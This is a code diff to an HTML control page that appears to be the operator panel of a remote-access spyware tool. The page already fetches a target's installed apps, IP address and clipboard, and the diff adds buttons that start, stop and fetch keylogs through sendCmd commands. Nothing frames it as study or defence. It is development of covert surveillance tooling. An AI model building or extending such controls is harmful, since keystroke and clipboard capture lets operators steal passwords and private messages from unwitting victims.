@@ -64,6 +64,9 @@
   <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
   <button class="fetch" id="btnFetchIp">Fetch Ip Address</button>
   <button class="fetch" id="btnFetchClip">Fetch ClipBoard</button>
+  <button class="fetch" id="btnStartKeyLog">Start KeyLogs</button>
+  <button class="fetch" id="btnStopKeyLog">Stop KeyLogs</button>
+  <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
   <button class="upload" id="btnUpload">Upload</button>
   <button class="close" id="btnClose">Close</button>
 
@@ -114,6 +117,9 @@
     document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
     document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
     document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
+    document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
+    document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
+    document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
     document.getElementById("btnUpload").onclick = () => sendCmd("upload");
     document.getElementById("btnClose").onclick = () => window.close();
 
